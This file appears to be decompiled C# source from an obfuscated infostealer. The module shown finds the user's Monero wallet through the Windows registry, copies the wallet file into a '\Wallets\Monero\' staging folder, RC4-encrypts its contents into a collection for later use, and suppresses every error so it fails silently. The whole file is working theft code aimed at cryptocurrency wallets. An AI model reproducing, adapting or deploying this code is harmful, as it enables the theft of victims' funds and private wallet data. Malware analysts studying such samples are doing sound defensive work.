using System;
using System.IO;
using Microsoft.Win32;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x0200004E RID: 78
	internal class Class_55
	{
		// Token: 0x0600015B RID: 347 RVA: 0x0000D930 File Offset: 0x0000BB30
		public static void tmethod_152(string str_0)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
				{
					try
					{
						string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
						File.Copy(text, str_0 + Class_55.field_1 + text.Split(new char[]
						{
							'\\'
						})[text.Split(new char[]
						{
							'\\'
						}).Length - 1]);
						Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + Class_55.field_1 + text.Split(new char[]
						{
							'\\'
						})[text.Split(new char[]
						{
							'\\'
						}).Length - 1], Class_47.RC4(File.ReadAllBytes(text)));
						Class_55.field_0++;
						Class_54.field_0++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x040000F0 RID: 240
		public static int field_0;

		// Token: 0x040000F1 RID: 241
		public static string field_1 = "\\Wallets\\Monero\\";
	}
}
